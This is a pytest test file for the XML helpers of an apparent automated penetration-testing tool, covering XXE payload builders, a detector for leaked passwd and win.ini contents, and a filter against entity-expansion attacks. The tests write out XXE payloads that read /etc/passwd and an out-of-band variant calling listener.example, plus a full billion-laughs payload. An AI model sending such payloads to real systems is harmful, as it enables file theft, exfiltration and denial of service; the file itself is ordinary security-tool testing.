from __future__ import annotations

import pytest

from penage.specialists.shared.xml_utils import (
    XmlSafetyFilter,
    XxeMarkerHit,
    XxeSignalFamily,
    build_classic_payload,
    build_oob_blind_payload,
    build_parameter_entity_payload,
    detect_xxe_markers,
)


# ---------------------------------------------------------------------------
# Builders
# ---------------------------------------------------------------------------


def test_build_classic_payload_contains_uri():
    body = build_classic_payload("file:///etc/passwd")
    assert '<?xml version="1.0" encoding="UTF-8"?>' in body
    assert 'SYSTEM "file:///etc/passwd"' in body
    assert "<!DOCTYPE xxe" in body
    assert "&xxe;" in body
    assert "{URI}" not in body
    assert "{ENTITY_NAME}" not in body


def test_build_classic_payload_respects_entity_name():
    body = build_classic_payload("file:///etc/hosts", entity_name="leak_it")
    assert "<!DOCTYPE leak_it" in body
    assert "<!ENTITY leak_it SYSTEM" in body
    assert "&leak_it;" in body
    assert "xxe" not in body


@pytest.mark.parametrize(
    "bad_name",
    [
        "1bad",
        "кириллица",
        "has space",
        "",
        "-leading-dash",
        "bad$char",
    ],
)
def test_build_classic_payload_rejects_invalid_entity_name(bad_name: str):
    with pytest.raises(ValueError):
        build_classic_payload("file:///etc/passwd", entity_name=bad_name)


def test_build_parameter_entity_payload_uses_percent():
    body = build_parameter_entity_payload("file:///etc/passwd")
    assert "<!ENTITY % param1 SYSTEM " in body
    assert "%param1;" in body
    assert 'SYSTEM "file:///etc/passwd"' in body
    assert "{URI}" not in body


def test_build_oob_blind_payload_contains_local_file():
    body = build_oob_blind_payload(
        "http://listener.example/xxe.dtd",
        local_file="/etc/hostname",
    )
    assert '<!ENTITY % file SYSTEM "file:///etc/hostname">' in body
    assert '<!ENTITY % dtd SYSTEM "http://listener.example/xxe.dtd">' in body
    assert "%dtd;" in body
    assert "{URI}" not in body
    assert "{LOCAL_FILE}" not in body


def test_build_oob_blind_payload_defaults_to_passwd():
    body = build_oob_blind_payload("http://listener.example/xxe.dtd")
    assert 'file:///etc/passwd' in body


# ---------------------------------------------------------------------------
# Detector
# ---------------------------------------------------------------------------


def test_detect_unix_passwd_hit():
    body = (
        "ok\nroot:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    )
    hits = detect_xxe_markers(body)
    families = [h.family for h in hits]
    assert XxeSignalFamily.UNIX_PASSWD in families
    passwd_hit = next(h for h in hits if h.family == XxeSignalFamily.UNIX_PASSWD)
    assert passwd_hit.marker.startswith("root:x:0:0:")
    assert "root:x:0:0:" in passwd_hit.snippet


def test_detect_unix_passwd_negative_on_fragment():
    # Truncated form — not a full passwd line. Must not fire.
    body = "some noise root:x:0: more noise"
    hits = [h for h in detect_xxe_markers(body) if h.family == XxeSignalFamily.UNIX_PASSWD]
    assert hits == []


def test_detect_win_ini():
    body = (
        "; for 16-bit app support\n"
        "[fonts]\n"
        "[extensions]\n"
        "[mci extensions]\n"
    )
    hits = detect_xxe_markers(body)
    families = [h.family for h in hits]
    assert XxeSignalFamily.WIN_INI in families
    markers = {h.marker.lower() for h in hits if h.family == XxeSignalFamily.WIN_INI}
    assert "[fonts]" in markers
    assert "[extensions]" in markers


def test_detect_entity_expansion_proc_version():
    body = "Linux version 5.4.0-generic (buildd@lgw01) (gcc 9.4.0) #42-Ubuntu SMP"
    hits = detect_xxe_markers(body)
    families = [h.family for h in hits]
    assert XxeSignalFamily.ENTITY_EXPANSION in families
    hit = next(h for h in hits if h.family == XxeSignalFamily.ENTITY_EXPANSION)
    assert hit.marker.startswith("Linux version")


def test_detect_entity_expansion_hostname_like():
    body = "web-01.internal"
    hits = detect_xxe_markers(body)
    families = [h.family for h in hits]
    assert XxeSignalFamily.ENTITY_EXPANSION in families


def test_detect_entity_expansion_suppressed_when_passwd_present():
    body = (
        "root:x:0:0:root:/root:/bin/bash\n"
        "Linux version 5.4.0-generic\n"
    )
    hits = detect_xxe_markers(body)
    families = [h.family for h in hits]
    assert XxeSignalFamily.UNIX_PASSWD in families
    assert XxeSignalFamily.ENTITY_EXPANSION not in families


def test_detect_xml_parse_error():
    body = "org.xml.sax.SAXParseException: Undefined entity 'xxe' at line 3 column 20"
    hits = detect_xxe_markers(body)
    assert any(h.family == XxeSignalFamily.XML_PARSE_ERROR for h in hits)
    err_hit = next(h for h in hits if h.family == XxeSignalFamily.XML_PARSE_ERROR)
    assert err_hit.marker.lower() == "undefined entity"


def test_detect_markers_returns_xxe_marker_hit_type():
    body = "root:x:0:0:root:/root:/bin/bash"
    hits = detect_xxe_markers(body)
    assert hits
    assert all(isinstance(h, XxeMarkerHit) for h in hits)
    assert all(len(h.snippet) <= 200 for h in hits)


def test_detect_empty_body_returns_empty_list():
    assert detect_xxe_markers("") == []


# ---------------------------------------------------------------------------
# XmlSafetyFilter
# ---------------------------------------------------------------------------


_BILLION_LAUGHS = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE lolz [\n'
    '  <!ENTITY lol "lol">\n'
    '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
    '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
    '  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n'
    '  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n'
    '  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n'
    ']>\n'
    '<lolz>&lol6;</lolz>'
)


def test_xml_safety_filter_blocks_excessive_entities():
    filt = XmlSafetyFilter()
    # 6 benign (non-referencing) entity declarations → excessive_entities.
    payload = (
        '<!DOCTYPE r [\n'
        '  <!ENTITY a "A">\n'
        '  <!ENTITY b "B">\n'
        '  <!ENTITY c "C">\n'
        '  <!ENTITY d "D">\n'
        '  <!ENTITY e "E">\n'
        '  <!ENTITY f "F">\n'
        ']>\n'
        '<r>ok</r>'
    )
    verdict = filt.check(payload)
    assert verdict.allowed is False
    assert verdict.reason == "excessive_entities"


def test_xml_safety_filter_blocks_recursive_entity():
    filt = XmlSafetyFilter()
    payload = (
        '<!DOCTYPE r [\n'
        '  <!ENTITY a "alpha">\n'
        '  <!ENTITY b "&a;-beta">\n'
        ']>\n'
        '<r>&b;</r>'
    )
    verdict = filt.check(payload)
    assert verdict.allowed is False
    assert verdict.reason == "recursive_entity"


def test_xml_safety_filter_blocks_entity_spam():
    filt = XmlSafetyFilter()
    # Single line with >10 entity refs, no recursive declarations.
    refs = "".join(f"&e;" for _ in range(12))
    payload = (
        '<!DOCTYPE r [ <!ENTITY e "x"> ]>\n'
        f'<r>{refs}</r>'
    )
    verdict = filt.check(payload)
    assert verdict.allowed is False
    assert verdict.reason == "entity_spam"


def test_xml_safety_filter_allow_dos_unblocks():
    filt = XmlSafetyFilter(allow_dos=True)
    verdict = filt.check(_BILLION_LAUGHS)
    assert verdict.allowed is True
    assert verdict.reason is None


def test_xml_safety_filter_benign_payload_allowed():
    filt = XmlSafetyFilter()
    benign = build_classic_payload("file:///etc/passwd")
    verdict = filt.check(benign)
    assert verdict.allowed is True
    assert verdict.reason is None
